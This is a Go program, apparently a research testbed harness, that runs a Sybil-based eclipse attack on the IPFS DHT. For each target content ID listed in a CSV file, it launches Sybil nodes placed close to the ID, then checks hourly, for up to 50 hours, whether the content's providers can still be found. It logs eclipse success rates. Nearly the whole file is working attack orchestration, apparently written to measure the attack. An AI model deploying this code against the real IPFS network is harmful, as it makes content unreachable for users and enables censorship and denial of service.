package main

import (
    "context"
    "fmt"
    "log"
    "os"
    "encoding/csv"
    "os/exec"
    "strings"
    "time"
    "strconv"
    "math/rand"
    "github.com/multiformats/go-multiaddr"
    "github.com/libp2p/go-libp2p-kad-dht"
    "github.com/ipfs/go-cid"
)

    
func attackSucces(output string)bool{
    if strings.Contains(output,"Providers: []"){
        fmt.Println("No providers found, successful attack")
        return true
        
    }else{
        fmt.Println("Providers found...")
        outputA := strings.Split(output, "\n\n")
        fmt.Println(outputA[1])
        return false
    }

}


type addrList []multiaddr.Multiaddr


type Config struct {
    Port           int
    Seed           int64
    DiscoveryPeers addrList
}


func Init() {
    rand.Seed(0)
}


func newDHTNode(config Config, ctx context.Context) (*dht.IpfsDHT) {
    h, err := NewHost(ctx, 0, 0)
    if err != nil {
        log.Fatal(err)
    }

    log.Printf("Host ID: %s", h.ID().Pretty())
    log.Printf("Connect to me on:")
    for _, addr := range h.Addrs() {
        log.Printf("  %s/p2p/%s", addr, h.ID().Pretty())
    }

    dht, routedHost := NewDHT(ctx, h, config.DiscoveryPeers)
    // Build host multiaddress
    hostAddr, _ := multiaddr.NewMultiaddr(fmt.Sprintf("/ipfs/%s", routedHost.ID().Pretty()))
    addrs := routedHost.Addrs()
    
    for _, addr := range addrs {
        log.Println(addr.Encapsulate(hostAddr))
    }
    return dht
}


func attackCid(tcid string, sybilNumber int, sybils []*exec.Cmd, ctx context.Context, config Config)([]string){
        start := time.Now()
        // get the targetCID to attack
        targetCID := tcid
        currentClosest := ""
        var peerIdList []string

        fmt.Println("Target CID:", targetCID)
        fmt.Println("Number of Sybils:", sybilNumber)
        fmt.Println("Getting closest nodes...")
        fmt.Println()

        out := string(getCurrentClosest(targetCID)[:])
        if out == "" {
                log.Println("Could not get closest nodes in DHT...")
                os.Exit(1)
        }
        temp := strings.Split(out, "\n")
        currentClosest = temp[0]
        peerIdList = temp[1:]
        fmt.Println("Current Closest:", currentClosest)
        fmt.Println("Peer List:", peerIdList)
        fmt.Println()
        t1 := time.Now()
        fmt.Println("Sleeping for ten seconds after killing Sybils...")
        time.Sleep(10 * time.Second)
        fmt.Println()
        t2 := time.Now()

        pkeylist, sybilcidlist := attackCID(targetCID, currentClosest, peerIdList, sybilNumber)

        sybils = launchSybils(pkeylist, sybilcidlist)
        end := time.Now()

        fmt.Println("Sleeping for a minute after launching Sybils...")
        time.Sleep(60 * time.Second)

        percentEclipsed := getPercentEclipsed(targetCID, sybilcidlist)
        fmt.Println("Percentage eclipsed: ", percentEclipsed)
        delay := (end.Sub(t2)) + (t1.Sub(start))
        fmt.Println("Attack time: ", delay)
        fmt.Println()

        attemptsPerHour :=5
        hrs:=0

        succesive :=0
        timeTillSucess := 50
        var sucessHourly []string
        var percentEclipsHourly []string

        cid0, err := cid.Decode(targetCID)
        if (err != nil) {
                log.Printf("Failed to decode cid %s", targetCID)
                log.Fatal(err)
        }

        for i := 0; i < 50+1; i++ {

                if succesive ==3{
                        break
                }
                sucess :=0
                fail:=0
                fmt.Println()
                fmt.Println("Checking eclipse status hour",strconv.Itoa(i) ,":")
                fmt.Println()

                for j :=0; j<attemptsPerHour; j++{
                        fmt.Println("Hour", i, ", attempt", j)
                        dht := newDHTNode(config, ctx)
                        provAddrInfos, err := dht.FindProviders(ctx, cid0)
                        if (err != nil) {
                                log.Fatal(err)
                        }

                        if len(provAddrInfos) > 0 {
                                fail = fail + 1
                                fmt.Println("Fail in eclipsing:",strconv.Itoa(len(provAddrInfos)) , "providers found")
                        } else {
                                sucess =sucess + 1
                                fmt.Println("Succes in eclipsing: No providers found")
                        }

                        if j==0 {
                                percentEclipsed := getPercentEclipsed(targetCID, sybilcidlist)
                                percentEclipsHourly = append(percentEclipsHourly, fmt.Sprintf("%f", percentEclipsed))
                                fmt.Println("Percent Eclipsed:", fmt.Sprintf("%f", percentEclipsed))
                                fmt.Println()
                        }
                        
                        fmt.Println("Percentage eclipsed: ", percentEclipsed)
                        fmt.Println()
                        //change with different number of DHT lookups
                        time.Sleep(4 * time.Minute)
                }

                if sucess ==attemptsPerHour{
                        succesive= succesive + 1
                        timeTillSucess = i
                }

                fmt.Println("Hour",strconv.Itoa(i) ,":")
                fmt.Println(strconv.Itoa(sucess), "successful eclipse queries (unreachable)")
                fmt.Println(strconv.Itoa(fail), "failed eclipse queries (reachable)")
                fmt.Println()

                sucessHourly = append(sucessHourly, strconv.Itoa(sucess))
                
                time.Sleep(40 * time.Minute)
                hrs= hrs + 1

        }
        killSybils(sybils)
        sRes := strings.Join(sucessHourly," ")
        pRes := strings.Join(percentEclipsHourly," ")
        record := []string{targetCID, delay.String(), strconv.Itoa(timeTillSucess), sRes, pRes}
        fmt.Println(record)
        fmt.Println()
        fmt.Println()
        return record
}

func main() {
        config := Config{}
        Init()
        ctx,_ := context.WithCancel(context.Background())

        var sybilnumber int
        var filename string
        var sybils []*exec.Cmd

        if len(os.Args) != 0 {
                sybilnumber, _ = strconv.Atoi(os.Args[1])
                filename = os.Args[2]
        }else{
                fmt.Println("Define the number of Sybils and CID list to use")
                os.Exit(1)
        }

        cidFile, err := os.Open("testbed/data/" + filename)
        if err != nil {
                fmt.Println(err)
        }
        defer cidFile.Close()

        cids, err := csv.NewReader(cidFile).ReadAll()
        if err != nil {
                fmt.Println(err)
        }

        results, err := os.OpenFile(LOGS_PATH+"results_sybil_" + strconv.Itoa(sybilnumber) + ".csv", os.O_WRONLY|os.O_CREATE|os.O_APPEND, 0644)
        if err != nil {
                log.Println(err)
                fmt.Println("error")
        }
        defer results.Close()

        resultswriter := csv.NewWriter(results)

        for _, CID0 := range cids {
                cid := CID0[0]
                result := attackCid(cid, sybilnumber, sybils, ctx, config)
                resultswriter.Write(result)
                resultswriter.Flush()
        }

}
